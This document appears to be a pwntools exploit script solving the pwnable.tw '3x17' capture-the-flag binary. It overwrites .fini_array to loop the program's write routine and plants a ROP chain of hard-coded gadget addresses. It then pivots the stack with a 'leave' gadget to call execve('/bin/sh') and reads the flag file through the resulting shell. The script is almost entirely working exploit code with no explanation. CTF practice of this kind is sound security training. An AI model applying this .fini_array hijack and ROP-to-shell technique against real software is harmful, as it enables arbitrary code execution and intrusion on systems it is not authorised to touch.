from pwn import *
aim=0x4b40f8
repeat=0x000000000401B6D
rbx=0x0000000000401e0b
start=aim+8
rdx_rsi=0x000000000044a309
rdi=0x0000000000401696
rax=0x000000000041e4af
sys=0x0000000000471db5
leave=0x000000000401C4B
rbp=0x0000000000401b2d
#eax=59
#edi,esi,edx
p=process("./3x17")
#p=remote("chall.pwnable.tw",10105)
p.sendafter("addr:",str(aim-8))
p.sendafter("data:",p64(0x000000000402960)+p64(repeat))

p.sendafter("addr:",str(start+0xa0))
p.sendafter("data:","/bin/sh\x00")

p.sendafter("addr:",str(start))
p.sendafter("data:",p64(rdx_rsi)+p64(0)+p64(0))

p.sendafter("addr:",str(start+0x18))
p.sendafter("data:",p64(rdi)+p64(start+0xa0)+p64(rax))

p.sendafter("addr:",str(start+0x30))
p.sendafter("data:",p64(59)+p64(sys))
gdb.attach(p,'b *0x000000000402988')
p.sendafter("addr:",str(aim-8))
p.sendafter("data:",p64(leave))
p.sendline("cat /home/3x17/*fl4g*")
p.interactive()
